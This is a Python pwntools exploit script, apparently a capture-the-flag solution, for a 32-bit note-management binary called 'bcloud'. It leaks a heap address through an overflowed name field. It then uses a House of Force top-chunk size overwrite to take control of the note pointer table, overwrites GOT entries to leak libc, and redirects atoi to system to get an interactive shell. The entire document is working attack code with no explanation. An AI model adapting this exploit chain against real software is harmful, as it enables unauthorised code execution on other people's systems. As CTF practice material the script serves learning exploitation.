from pwn import *

p = process('./bcloud')
elf = ELF('./bcloud')
libc = ELF('libc.so')
context.log_level = 'debug'

#leak --> heap_base_addr
p.sendafter('Input your name:\n','A'*64)
p.recvuntil('A'*64)
data = u32(p.recv(4))
heap_base = data - 0x8
log.success('heap\'s base addr is :'+hex(heap_base))

p.sendafter('Org:\n','A'*64)
p.sendlineafter('Host:\n',p32(0xffffffff))

#top_chunk extand --> bss --> size
p.recvuntil('option--->>\n')
p.sendline('1')
payload = heap_base - 0x804B0A0
payload = -payload - 0xe0 - 8
p.sendlineafter('Input the length of the note content:\n',str(payload))

#create 2 chunks --> change the chunk1's size --> control the bss_ptr
p.recvuntil('option--->>\n')
p.sendline('1')
p.recvuntil('Input the length of the note content:\n')
p.sendline(str(0x50))
p.sendlineafter('Input the content:\n',p32(0x10)*3)

p.recvuntil('option--->>\n')
p.sendline('1')
p.recvuntil('Input the length of the note content:\n')
p.sendline(str(0x50))
p.sendlineafter('Input the content:\n','AAAA')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']

#change the chunk's ptr
p.recvuntil('option--->>\n')
p.sendline('3')
p.sendlineafter('Input the id:\n','2')
payload2 = 'A'*40 + p32(free_got) + p32(puts_got) + p32(atoi_got)
p.sendlineafter('Input the new content:\n',payload2)

#free --> puts_plt
p.recvuntil('option--->>\n')
p.sendline('3')
p.sendlineafter('Input the id:\n','0')
payload3 = p32(puts_plt)
p.sendlineafter('Input the new content:\n',payload3)
log.info('puts_plt :'+hex(puts_plt))

#leak --> puts_got
p.recvuntil('option--->>\n')
p.sendline('4')
p.sendlineafter('Input the id:\n','1')

#leak --> system_addr
data2 = u32(p.recv(4))
log.success('leak puts addr is :'+hex(data2))
libc_base = data2 - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
log.success('system_addr is :'+hex(system_addr))

#change the atoi_got --> system_addr
p.recvuntil('option--->>\n')
p.sendline('3')
p.sendlineafter('Input the id:\n','2')
payload4 = p32(system_addr)
p.sendlineafter('Input the new content:\n',payload4)

p.interactive()
